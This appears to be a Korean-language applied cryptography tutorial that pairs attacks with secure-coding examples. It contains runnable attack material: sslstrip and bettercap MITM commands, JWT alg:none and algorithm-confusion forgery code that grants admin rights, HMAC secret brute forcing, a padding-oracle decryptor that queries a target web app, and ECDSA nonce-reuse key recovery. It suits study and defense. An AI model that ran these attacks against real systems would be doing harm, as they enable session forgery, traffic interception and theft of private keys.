# 응용 암호학 — 실전 취약점과 방어

## 1. 공개키 인프라 (PKI) 공격

### 인증서 위조 및 중간자 공격

```bash
# mitmproxy로 HTTPS 인터셉트
mitmproxy --mode transparent

# 자가 서명 인증서로 MITM
openssl req -x509 -newkey rsa:4096 -keyout mitm.key \
    -out mitm.crt -days 365 -nodes \
    -subj "/C=KR/O=Example Corp/CN=*.target.com"

# sslstrip (HTTPS → HTTP 다운그레이드)
sslstrip -l 10000 -w /tmp/sslstrip.log
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# Bettercap SSL strip
sudo bettercap
set https.proxy.sslstrip true
https.proxy on
```

### 인증서 투명성 (Certificate Transparency) 활용

```bash
# crt.sh - 발급된 인증서 검색
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
    python3 -c "
import json, sys
certs = json.load(sys.stdin)
for c in certs:
    print(c.get('name_value', '').replace('\\n', '\n'))
" | sort -u

# 서브도메인 발견에 활용
curl -s "https://crt.sh/?q=%.company.com&output=json" | \
    python3 -c "
import json, sys, re
data = json.load(sys.stdin)
domains = set()
for cert in data:
    names = cert.get('name_value', '')
    for domain in names.split():
        if domain.endswith('.company.com'):
            domains.add(domain)
for d in sorted(domains):
    print(d)
"
```

---

## 2. PGP/GPG 운용

```bash
# GPG 키 생성
gpg --full-generate-key

# 공개키 내보내기
gpg --export --armor user@email.com > public_key.asc

# 개인키 내보내기 (백업)
gpg --export-secret-keys --armor user@email.com > private_key.asc

# 파일 암호화 (수신자 공개키로)
gpg --encrypt --recipient recipient@email.com secret.txt
# → secret.txt.gpg 생성

# 파일 복호화
gpg --decrypt secret.txt.gpg

# 파일 서명
gpg --sign --detach-sig document.pdf
# → document.pdf.sig 생성

# 서명 검증
gpg --verify document.pdf.sig document.pdf

# GPG 키 강도 확인
gpg --edit-key user@email.com showpref

# 취약한 GPG 설정 탐지
# SHA-1 서명 사용 시:
gpg --list-sigs | grep "SHA1"
```

---

## 3. JWT (JSON Web Token) 심층 분석

### JWT 구조 및 알고리즘

```python
import base64
import json
import hmac
import hashlib
from typing import Optional

def decode_jwt(token: str) -> tuple:
    """JWT 디코딩 (검증 없이)"""
    parts = token.split('.')
    
    def b64_decode(s: str) -> dict:
        # Base64url 패딩 추가
        padding = 4 - len(s) % 4
        s += '=' * padding
        return json.loads(base64.urlsafe_b64decode(s))
    
    header = b64_decode(parts[0])
    payload = b64_decode(parts[1])
    signature = parts[2]
    
    return header, payload, signature

def create_jwt(payload: dict, secret: str, algorithm: str = 'HS256') -> str:
    """JWT 생성"""
    header = {"alg": algorithm, "typ": "JWT"}
    
    def b64_encode(data: dict) -> str:
        return base64.urlsafe_b64encode(
            json.dumps(data, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()
    
    header_b64 = b64_encode(header)
    payload_b64 = b64_encode(payload)
    
    message = f"{header_b64}.{payload_b64}"
    
    if algorithm == 'HS256':
        sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
    elif algorithm == 'none':
        sig_b64 = ""
    
    return f"{message}.{sig_b64}"

# ===== JWT 공격 =====

def jwt_none_attack(token: str) -> str:
    """alg:none 공격 - 서명 제거"""
    parts = token.split('.')
    header_data = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # 관리자 권한으로 페이로드 변조
    payload_data['role'] = 'admin'
    payload_data['admin'] = True
    
    # alg를 none으로 변경
    header_data['alg'] = 'none'
    
    new_header = base64.urlsafe_b64encode(
        json.dumps(header_data).encode()
    ).rstrip(b'=').decode()
    
    new_payload = base64.urlsafe_b64encode(
        json.dumps(payload_data).encode()
    ).rstrip(b'=').decode()
    
    # 서명 없음
    return f"{new_header}.{new_payload}."

def jwt_rs256_to_hs256(token: str, public_key: str) -> str:
    """RS256 → HS256 알고리즘 혼동 공격"""
    import jwt as pyjwt
    
    parts = token.split('.')
    payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # 페이로드 수정
    payload_data['role'] = 'admin'
    
    # RS256의 공개키를 HS256의 비밀키로 사용
    # 서버가 공개키로 HS256 검증을 시도 → 공격 성공
    forged_token = pyjwt.encode(
        payload_data,
        public_key,
        algorithm='HS256'
    )
    
    return forged_token

def jwt_brute_force(token: str, wordlist: str) -> Optional[str]:
    """HMAC 비밀키 브루트포스"""
    parts = token.split('.')
    message = f"{parts[0]}.{parts[1]}"
    signature = base64.urlsafe_b64decode(parts[2] + '==')
    
    with open(wordlist, 'r', encoding='latin-1') as f:
        for line in f:
            secret = line.strip()
            
            test_sig = hmac.new(
                secret.encode(), 
                message.encode(), 
                hashlib.sha256
            ).digest()
            
            if test_sig == signature:
                print(f"[+] 비밀키 발견: {secret}")
                return secret
    
    return None
```

---

## 4. 암호화 구현 취약점

### Padding Oracle 공격

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os

def padding_oracle_attack(ciphertext: bytes, iv: bytes, 
                          oracle_function) -> bytes:
    """
    Padding Oracle 공격으로 CBC 복호화
    oracle_function(iv, ciphertext) → True(올바른 패딩) / False
    
    원리:
    P[i] = D(C[i]) XOR C[i-1]
    
    조작된 IV'로 패딩 오라클 이용:
    D(C[i]) = P'[i] XOR IV'[i]
    패딩이 올바른 IV'[i]를 찾으면:
    P[i] = 0x01 XOR IV'[i]
    """
    
    block_size = 16
    plaintext = b""
    
    # 각 블록 복호화
    blocks = [iv] + [ciphertext[i:i+block_size] 
                     for i in range(0, len(ciphertext), block_size)]
    
    for block_idx in range(1, len(blocks)):
        current_block = blocks[block_idx]
        prev_block = blocks[block_idx - 1]
        
        intermediate = bytearray(block_size)
        
        # 각 바이트를 역순으로 복구
        for byte_pos in range(block_size - 1, -1, -1):
            padding_value = block_size - byte_pos
            
            # 이미 알려진 바이트로 IV' 설정
            modified_iv = bytearray(block_size)
            for k in range(byte_pos + 1, block_size):
                modified_iv[k] = intermediate[k] ^ padding_value
            
            # 현재 바이트 브루트포스
            for guess in range(256):
                modified_iv[byte_pos] = guess
                
                if oracle_function(bytes(modified_iv), current_block):
                    # 패딩 0x01 발생
                    intermediate[byte_pos] = guess ^ padding_value
                    break
        
        # 평문 복원
        plaintext += bytes([i ^ p for i, p in zip(intermediate, prev_block)])
    
    # PKCS7 패딩 제거
    try:
        return unpad(plaintext, block_size)
    except:
        return plaintext

# 실제 취약한 웹앱에서의 활용
def web_padding_oracle(iv: bytes, ciphertext: bytes) -> bool:
    """실제 웹 앱 패딩 오라클 예시"""
    import requests
    
    import base64
    token = base64.b64encode(iv + ciphertext).decode()
    
    # 취약한 앱이 패딩 오류 시 500, 성공 시 200/302
    resp = requests.get(
        f"https://target.com/decrypt?token={token}"
    )
    
    return resp.status_code != 500  # 500이 아니면 올바른 패딩
```

### ECDSA 논스 재사용 공격

```python
from ecdsa import NIST256p, SigningKey
from hashlib import sha256
import random

def ecdsa_nonce_reuse_attack(r: int, s1: int, s2: int, 
                              z1: int, z2: int, q: int) -> int:
    """
    ECDSA에서 같은 논스 k 사용 시:
    s1 = k^-1 * (z1 + r*d) mod q
    s2 = k^-1 * (z2 + r*d) mod q
    
    k = (z1 - z2) * (s1 - s2)^-1 mod q
    d = (s1*k - z1) * r^-1 mod q
    """
    
    def modinv(a, m):
        """확장 유클리드 알고리즘으로 모듈러 역수"""
        g, x, _ = extended_gcd(a, m)
        if g != 1:
            raise ValueError("역수 없음")
        return x % m
    
    def extended_gcd(a, b):
        if a == 0:
            return b, 0, 1
        g, x, y = extended_gcd(b % a, a)
        return g, y - (b // a) * x, x
    
    # k 복원
    k = (z1 - z2) * modinv(s1 - s2, q) % q
    
    # 개인키 d 복원
    d = (s1 * k - z1) * modinv(r, q) % q
    
    return d, k

# 비트코인 사례: 같은 k로 서명 → 개인키 유출 → 지갑 탈취
# 2013년 PlayStation 3 개인키 유출 (동일 논스 사용)
```

---

## 5. 암호화 API 올바른 사용법

### Python 암호화 올바른 사용

```python
# cryptography 라이브러리 사용 (권장)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
import os
import base64

class SecureCrypto:
    """안전한 암호화 구현"""
    
    @staticmethod
    def encrypt_aes_gcm(plaintext: bytes, key: bytes = None) -> dict:
        """AES-256-GCM 인증 암호화 (AEAD)"""
        if key is None:
            key = os.urandom(32)  # 256비트 키
        
        nonce = os.urandom(12)  # 96비트 논스
        
        aesgcm = AESGCM(key)
        ciphertext = aesgcm.encrypt(nonce, plaintext, None)
        
        return {
            'key': base64.b64encode(key).decode(),
            'nonce': base64.b64encode(nonce).decode(),
            'ciphertext': base64.b64encode(ciphertext).decode()
        }
    
    @staticmethod
    def decrypt_aes_gcm(encrypted: dict) -> bytes:
        """AES-256-GCM 복호화 및 인증 검증"""
        key = base64.b64decode(encrypted['key'])
        nonce = base64.b64decode(encrypted['nonce'])
        ciphertext = base64.b64decode(encrypted['ciphertext'])
        
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ciphertext, None)
    
    @staticmethod
    def hash_password(password: str) -> str:
        """Argon2id로 비밀번호 해싱 (권장)"""
        from argon2 import PasswordHasher
        
        ph = PasswordHasher(
            time_cost=2,        # 반복 횟수
            memory_cost=65536,  # 64MB 메모리
            parallelism=2,      # 병렬 처리
            hash_len=32,        # 해시 길이
            salt_len=16         # 솔트 길이
        )
        return ph.hash(password)
    
    @staticmethod
    def verify_password(password: str, hash_str: str) -> bool:
        """비밀번호 검증"""
        from argon2 import PasswordHasher
        from argon2.exceptions import VerifyMismatchError
        
        ph = PasswordHasher()
        try:
            return ph.verify(hash_str, password)
        except VerifyMismatchError:
            return False
    
    @staticmethod
    def derive_key(password: str, salt: bytes = None) -> tuple:
        """PBKDF2로 키 유도"""
        if salt is None:
            salt = os.urandom(16)
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=600000,  # NIST 권장 600,000회
        )
        
        key = kdf.derive(password.encode())
        return key, salt
    
    @staticmethod
    def generate_token(length: int = 32) -> str:
        """암호학적으로 안전한 토큰 생성"""
        return base64.urlsafe_b64encode(os.urandom(length)).decode()

# 사용 예시
crypto = SecureCrypto()

# 파일 암호화
with open('secret.txt', 'rb') as f:
    data = f.read()

encrypted = crypto.encrypt_aes_gcm(data)
print(f"암호화 완료: {len(encrypted['ciphertext'])} bytes")

# 복호화
decrypted = crypto.decrypt_aes_gcm(encrypted)
assert decrypted == data

# 비밀번호 저장
hashed = crypto.hash_password("UserPassword123!")
is_valid = crypto.verify_password("UserPassword123!", hashed)
print(f"비밀번호 검증: {is_valid}")

# 세션 토큰
token = crypto.generate_token()
print(f"토큰: {token}")
```

---

## 6. 실전 암호 취약점 사례

### 예측 가능한 UUID 생성

```python
import uuid
import time

# 취약한 UUID 생성 (타임스탬프 기반)
def vulnerable_uuid():
    # UUID v1: 타임스탬프 + MAC 주소
    return str(uuid.uuid1())

# 안전한 UUID 생성
def secure_uuid():
    # UUID v4: 완전한 난수
    return str(uuid.uuid4())

# UUID v1 공격: 타임스탬프 추출
def extract_timestamp_from_uuid_v1(uuid_str: str):
    u = uuid.UUID(uuid_str)
    # UUID v1 타임스탬프는 1582년 10월 15일부터 100ns 단위
    timestamp = (u.time - 0x01b21dd213814000) * 100 / 1e9
    from datetime import datetime, timezone
    return datetime.fromtimestamp(timestamp, tz=timezone.utc)
```

### 잘못된 랜덤 IV 재사용

```python
# 취약한 구현
class VulnerableEncryption:
    def __init__(self):
        self.key = os.urandom(32)
        self.iv = os.urandom(16)  # 고정 IV!
    
    def encrypt(self, data: bytes) -> bytes:
        from Crypto.Cipher import AES
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)  # 항상 같은 IV
        return cipher.encrypt(pad(data, 16))

# 안전한 구현
class SecureEncryption:
    def __init__(self):
        self.key = os.urandom(32)
    
    def encrypt(self, data: bytes) -> bytes:
        iv = os.urandom(16)  # 매번 새 IV 생성
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(data, 16))
        return iv + ciphertext  # IV를 암호문 앞에 포함
    
    def decrypt(self, data: bytes) -> bytes:
        iv = data[:16]
        ciphertext = data[16:]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(ciphertext), 16)
```

---

## 7. 암호화 CTF 문제 유형

```
유형 1: ECB Mode Detection
  - 반복되는 블록 패턴 탐지
  - 동일 16바이트 입력 → 동일 출력

유형 2: CBC Bit Flipping
  - IV/이전 블록 조작으로 복호화 결과 변조

유형 3: Padding Oracle
  - 서버 오류 응답으로 CBC 복호화

유형 4: RSA Small E
  - e=3, 작은 메시지 → 세제곱근

유형 5: RSA Common Factor
  - 두 공개키 GCD ≠ 1

유형 6: ECDSA Nonce Reuse
  - 같은 r값인 두 서명 → 개인키 복원

유형 7: Length Extension
  - MD5/SHA1에서 H(secret||msg) → H(secret||msg||padding||extra)

유형 8: Weak PRNG
  - time.time() 기반 시드 → 시간 범위 전수 탐색

도구:
  SageMath (수학 계산)
  PyCryptodome (구현)
  factordb (소인수 분해)
  CyberChef (변환/분석)
  RsaCtfTool (RSA 자동 공격)
```

```bash
# RsaCtfTool - RSA CTF 자동 풀이
git clone https://github.com/RsaCtfTool/RsaCtfTool
cd RsaCtfTool
pip3 install -r requirements.txt

# 공개키에서 개인키 복원 시도 (여러 공격 자동)
python3 RsaCtfTool.py --publickey public.pem --private

# n, e로 공격
python3 RsaCtfTool.py -n MODULUS -e 65537 --private

# 암호문 복호화
python3 RsaCtfTool.py --publickey public.pem \
    --uncipherfile ciphertext.bin \
    --private
```
